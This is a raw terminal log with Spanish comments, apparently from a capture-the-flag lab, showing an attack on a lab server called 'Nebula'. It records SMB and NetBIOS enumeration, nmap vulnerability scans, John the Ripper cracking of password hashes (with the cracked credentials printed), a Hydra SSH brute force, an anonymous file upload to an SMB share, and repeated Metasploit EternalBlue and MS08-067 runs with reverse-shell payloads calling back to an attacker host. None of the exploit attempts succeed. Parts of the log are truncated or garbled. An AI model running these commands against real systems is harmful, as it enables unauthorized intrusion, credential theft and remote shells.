root         2  0.0  0.0      0     0 ?        S    09:02   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    09:02   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   09:02   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    09:02   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    09:02   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    09:02   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    09:02   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    09:02   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   09:02   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   09:02   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    09:02   0:00 [xenwatch]
root        15  0.0  0.0      0     0 ?        S    09:02   0:00 [xenbus]
root        16  0.0  0.0      0     0 ?        S    09:02   0:00 [kworker/0:1]
root        17  0.0  0.0      0     0 ?        S    09:02   0:00 [khungtaskd]
root        18  0.0  0.0      0     0 ?        S<   09:02   0:00 [writeback]
root        19  0.0  0.0      0     0 ?        SN   09:02   0:00 [ksmd]
root        20  0.0  0.0      0     0 ?        SN   09:02   0:00 [khugepaged]
root        21  0.0  0.0      0     0 ?        S<   09:02   0:00 [crypto]
                                                                  
┌──(kali㉿kali)-[~]
└─$ nbtscan -v 10.10.30.139

Doing NBT name scan for addresses from 10.10.30.139


NetBIOS Name Table for Host 10.10.30.139:

Incomplete packet, 245 bytes long.
Name             Service          Type             
----------------------------------------
NEBULA-SERVER    <00>             UNIQUE
NEBULA-SERVER    <03>             UNIQUE
NEBULA-SERVER    <20>             UNIQUE
__MSBROWSE__  <01>              GROUP
NEBULA_ROCKS     <00>              GROUP
NEBULA_ROCKS     <1b>             UNIQUE
NEBULA_ROCKS     <1d>             UNIQUE
NEBULA_ROCKS     <1e>              GROUP

Adapter address: 00:00:00:00:00:00
----------------------------------------
       
  ┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.30.139 -p 44544 -U ''

Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        nebula_share    Disk      
        IPC$            IPC       IPC Service (Nebula.io File Tansfer Server)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.30.139 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ nmblookup -A 10.10.30.139

Looking up status of 10.10.30.139
        NEBULA-SERVER   <00> -         B <ACTIVE> 
        NEBULA-SERVER   <03> -         B <ACTIVE> 
        NEBULA-SERVER   <20> -         B <ACTIVE> 
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
        NEBULA_ROCKS    <00> - <GROUP> B <ACTIVE> 
        NEBULA_ROCKS    <1b> -         B <ACTIVE> 
        NEBULA_ROCKS    <1d> -         B <ACTIVE> 
        NEBULA_ROCKS    <1e> - <GROUP> B <ACTIVE> 

        MAC Address = 00-00-00-00-00-00

Despues de haer varias veces con hydra para descifrar la contraseña y no obtoner resultado lo intento con john ripper

┌──(kali㉿kali)-[~]
└─$ cd ~/Documents/Nebula_Bluffer  

                                                                        
┌──(kali㉿kali)-[~/Documents/Nebula_Bluffer]
└─$ nano nebula_hashes.txt 

                                                                                                                          
┌──(kali㉿kali)-[~/Documents/Nebula_Bluffer]
└─$ nano nebula_hashes.txt

                                                                                                                          
┌──(kali㉿kali)-[~/Documents/Nebula_Bluffer]
└─$ gunzip /usr/share/wordlists/rockyou.txt.gz

gzip: /usr/share/wordlists/rockyou.txt.gz: No such file or directory
                                                                                                                          
┌──(kali㉿kali)-[~/Documents/Nebula_Bluffer]
└─$ ls /usr/share/wordlists/

amass  dirbuster   fasttrack.txt  john.lst  metasploit  rockyou.txt  sqlmap.txt     wfuzz
dirb   dnsmap.txt  fern-wifi      legion    nmap.lst    seclists     usernames.txt  wifite.txt
                                                                                                                          
┌──(kali㉿kali)-[~/Documents/Nebula_Bluffer]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Created directory: /home/kali/.john
stat: hashes.txt: No such file or directory
                                                                                                                          
┌──(kali㉿kali)-[~/Documents/Nebula_Bluffer]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt nebula_hashes.txt

Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
homer            (root)     
kamikaze2        (guakamole)     
2g 0:00:14:27 DONE (2025-04-19 17:21) 0.002306g/s 16544p/s 17286c/s 17286C/s !!!playboy!!!7..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

Se descubre esto en otra sala Threat Management 2025 y la respuesta de Nebula_Work está aquí incuida la del netbios, no pudiendo responder a dichas preguntas por no estar ya la Task 8
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -sC -sV 10.10.252.140

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 12:27 EDT
Nmap scan report for 10.10.252.140
Host is up (0.096s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
53/tcp  open  domain      ISC BIND 9.9.5-3ubuntu0.19 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.19-Ubuntu
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: NEBULA_WORKS)
445/tcp open  netbios-ssn Samba smbd 4.5.0 (workgroup: NEBULA_WORK
Service Info: Host: NEBULA-SERVER; OS: Linux; CPE: cpe:/o:linux:lirnel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: NEBULA-SERVER, NetBIOS user: <unknown>, NeMAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.0)
|   Computer name: nebula-server
|   NetBIOS computer name: NEBULA-SERVER\x00
|   Domain name: nebula.io
|   FQDN: nebula-server.nebula.io
|_  System time: 2025-04-21T18:28:05+02:00
| smb2-time: 
|   date: 2025-04-21T16:28:05
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -1s

Service detection performed. Please report any incorrect results as://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.32 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -sC -p- --script vuln 10.10.252.140 -oN scan_siem.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 12:16 EDT
Stats: 1:26:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan

Nmap scan report for 10.10.252.140
Host is up (0.082s latency).
Not shown: 64575 closed tcp ports (reset), 955 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
53/tcp    open  tcpwrapped
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
1986/tcp  open  tcpwrapped
45900/tcp open  tcpwrapped

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14681.35 seconds

Encontramos de nuevo por el puerto 45900 la pagina de Bluffer y después el archivo que utilizamos con Hydra
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ ssh bluffer@10.10.109.239
ssh: connect to host 10.10.109.239 port 22: Connection refused
                                                                                                                          


http://10.10.109.239:45900/nebula_files/esternocleidomastoideo.txt

Se realiza atace fuerza bruta con hydra y poder encontrar las credenciales de Lucas

┌──(root㉿kali)-[/home/kali]
└─# hydra -l lucas -P /home/kali/Documents/Nebula_Bluffer/Password_Nebula.txt -t 4 ssh://10.10.109.209

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-22 03:13:28
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 517 login tries (l:1/p:517), ~130 tries per task
[DATA] attacking ssh://10.10.109.209:22/
[STATUS] 65.00 tries/min, 65 tries in 00:01h, 452 to do in 00:07h, 4 active
[STATUS] 66.67 tries/min, 200 tries in 00:03h, 317 to do in 00:05h, 4 active
[STATUS] 63.43 tries/min, 444 tries in 00:07h, 73 to do in 00:02h, 4 active
[STATUS] 63.75 tries/min, 510 tries in 00:08h, 7 to do in 00:01h, 4 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-22 03:21:50


Se realiza con nessus el escanero de los puertos abiertos en el puerto 445 la vulnerabilidad indica que se puede entrar con el servicio de smb sin credianciales


se conecta con smb

┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.109.239/nebula_share -N

Try "help" to get a list of possible commands.
smb: \> whoami
whoami: command not found
smb: \> sudo su
sudo: command not found
smb: \> ls
  .                                   D        0  Sat Oct 26 15:15:56 2024
  ..                                  D        0  Fri O

                10900304 blocks of size 1024. 8548776 b
smb: \> echo "prueba" > testfile.txt
smb: \> put testfile.txt
testfile.txt does not exist
smb: \> exit
                                                       
┌──(kali㉿kali)-[~]
└─$ echo "prueba" > testfile.txt

                                                       
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.109.239/nebula_share -N

Try "help" to get a list of possible commands.
smb: \> put testfile.txt
putting file testfile.txt as \testfile.txt (0.0 kb/s) (
smb: \>  ls -R
NT_STATUS_NO_SUCH_FILE listing \-R
smb: \> ls
  .                                   D        0  Tue A
  ..                                  D        0  Fri O
  testfile.txt                        A        7  Tue A

                10900304 blocks of size 1024. 8548772 b
smb: \> cd docs
cd \docs\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> get testfile.txt
getting file \testfile.txt of size 7 as testfile.txt (0
smb: \> 


se intenta conectacar con metasploit y nos indica que no es vulnerable

┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Start commands with a space to avoid saving them to history
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                     
                                                                  

       =[ metasploit v6.4.56-dev                          ]
+ -- --=[ 2496 exploits - 1282 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.109.239
RHOST => 10.10.109.239
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 445
RPORT => 445
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.21.128:4444 
[*] 10.10.109.239:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.10.109.239:445     - Host does NOT appear vulnerable.
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.16/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.10.109.239:445     - Scanned 1 of 1 hosts (100% complete)
[-] 10.10.109.239:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
 







┌──(kali㉿kali)-[~]
└─$ nmap -p 445 --script smb-os-discovery 10.10.109.239

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-22 05:24 EDT
Nmap scan report for 10.10.109.239
Host is up (0.079s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.0)
|   Computer name: nebula-server
|   NetBIOS computer name: NEBULA-SERVER\x00
|   Domain name: nebula.io
|   FQDN: nebula-server.nebula.io
|_  System time: 2025-04-22T11:24:41+02:00

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds


xplorar recursos compartidos de Samba: Si el servicio SMB es accesible

┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.10.109.239 -N


        Sharename       Type      Comment
        ---------       ----      -------
        nebula_share    Disk      
        IPC$            IPC       IPC Service (Samba Server on nebula.io)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        NEBULA_WORKS         NEBULA-SERVER

┌──(kali㉿kali)-[~]
└─$ wget http://10.10.109.239:45900/nebula_files/esternocleidomastoideo.txt

--2025-04-22 05:43:11--  http://10.10.109.239:45900/nebula_files/esternocleidomastoideo.txt
Connecting to 10.10.109.239:45900... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3710 (3.6K) [text/plain]
Saving to: ‘esternocleidomastoideo.txt.1’

esternocleidomastoideo.txt.1   100%[==================================================>]   3.62K  --.-KB/s    in 0s      

2025-04-22 05:43:11 (425 MB/s) - ‘esternocleidomastoideo.txt.1’ saved [3710/3710]


┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 45900 10.10.109.239

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-22 06:07 EDT
Nmap scan report for 10.10.109.239
Host is up (0.068s latency).

PORT      STATE SERVICE VERSION
45900/tcp open  http    lighttpd 1.4.33

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.53 seconds

Se intenta con metasploit pero no hay manera de conectar con la maquina

sf' from deb tcm
  command 'msd' from deb libxrt-utils
  command 'gsf' from deb libgsf-bin
  command 'msb' from deb mysql-sandbox
  command 'mf' from deb texlive-binaries
Try: sudo apt install <deb name>
                                                       
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: To save all commands executed since start up to a file, use the 
makerc command
                                                  
               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,        
 lMMMMMMMMMMk.                         .kMMO'          
  dMMMMMMMMMMWd'                         ..            
   cWMMMMMMMMMMMNxc'.                ##########        
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:                                
                                :::::::+:
                      Metasploit

       =[ metasploit v6.4.56-dev                          ]
+ -- --=[ 2505 exploits - 1288 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHtima <IP objetivo>  # Dirección IP de la máquina víc 
RHOSTS => <IP objetivo> # Dirección IP de la máquina víctima
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 445  # Puerto SMB
[-] The following options failed to validate: Value '445 # Puerto SMB' is not valid for option 'RPORT'.
RPORT => 445
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/shell_reverse_tcp  # Usamos el reverse shell
[-] The value specified for PAYLOAD is not valid.
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.21.128  # Tu IP de escucha
LHOST => 192.168.21.128 # Tu IP de escucha
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444  # Puerto donde escuchas
LPORT => 4444 # Puerto donde escuchas
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[-] Msf::OptionValidateError The following options failed to validate:
[-] Invalid option RHOSTS: Host resolution failed: <IP, objetivo>, #, Dirección, IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.109.239
RHOST => 10.10.109.239
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 45900
RPORT => 45900
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.21.128
LHOST => 192.168.21.128
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
LPORT => 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[-] Handler failed to bind to 192.168.21.128:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] 10.10.109.239:45900 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.21.128:4444 
[*] 10.10.109.239:45900 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.10.109.239:45900   - An SMB Login Error occurred while connecting to the IPC$ tree.
[*] 10.10.109.239:45900   - Scanned 1 of 1 hosts (100% complete)
[-] 10.10.109.239:45900 - The target is not vulnerable.
[*] Sending stage (203846 bytes) to 192.168.21.128
[-] Meterpreter session 1 is not valid and will be closed
[*] 10.10.109.239 - Meterpreter session 1 closed.

whoami
^C[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.21.128:5555 
[*] 10.10.109.239:45900 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.10.109.239:45900   - An SMB Login Error occurred while connecting to the IPC$ tree.
[*] 10.10.109.239:45900   - Scanned 1 of 1 hosts (100% complete)
[-] 10.10.109.239:45900 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.109.239
RHOST => 10.10.109.239
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.21.128
LHOST => 192.168.21.128
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
[*] Started reverse TCP handler on 192.168.21.128:5555 
[*] 10.10.109.239:445 - Automatically detecting the target...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.16/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.10.109.239:445 - Fingerprint: Unknown -  - lang:Unknown
[-] 10.10.109.239:445 - Exploit aborted due to failure: no-target: No matching target
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > set RPORT 45900
RPORT => 45900
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.109.239
RHOST => 10.10.109.239
msf6 exploit(windows/smb/ms08_067_netapi) > set RPORT 45900
RPORT => 45900
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.21.128
LHOST => 192.168.21.128
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 4444
LPORT => 4444
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
[*] Started reverse TCP handler on 192.168.21.128:4444 
[-] 10.10.109.239:45900 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: execution expired
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > LHOST 10.8.105.111
[-] Unknown command: LHOST. Did you mean hosts? Run the help command for more details.
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
[*] Started reverse TCP handler on 192.168.21.128:4444 
[-] 10.10.109.239:45900 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: execution expired
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.8.105.111
LHOST => 10.8.105.111
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.109.239
RHOST => 10.10.109.239
msf6 exploit(windows/smb/ms08_067_netapi) > set RPORT 45900
RPORT => 45900
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 4444  # o el puerto que estés utilizando
LPORT => 4444 # o el puerto que estés utilizando
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 4444
LPORT => 4444
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
[*] Started reverse TCP handler on 10.8.105.111:4444 
[-] 10.10.109.239:45900 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: execution expired
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > set SMBUser guakamole
SMBUser => guakamole
msf6 exploit(windows/smb/ms08_067_netapi) > set SMBPass kamikaze2
SMBPass => kamikaze2
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
[*] Started reverse TCP handler on 10.8.105.111:4444 
[-] 10.10.109.239:45900 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: execution expired
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/smb/ms08_067_netapi) > 
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
[-] Handler failed to bind to 10.8.105.111:5555:-  -
[-] Handler failed to bind to 0.0.0.0:5555:-  -
[-] 10.10.109.239:45900 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:5555).
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > msf6 exploit(windows/smb/ms08_067_netapi) > exploit
[-] Unknown command: msf6. Run the help command for more details.
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.8.105.111
LHOST => 10.8.105.111
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.109.239
RHOST => 10.10.109.239
msf6 exploit(windows/smb/ms08_067_netapi) > set RPORT 45900
RPORT => 45900
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
[-] Handler failed to bind to 10.8.105.111:5555:-  -
[-] Handler failed to bind to 0.0.0.0:5555:-  -
[-] 10.10.109.239:45900 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:5555).
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > 

                                                             
                                                                                                                                                         
                                       
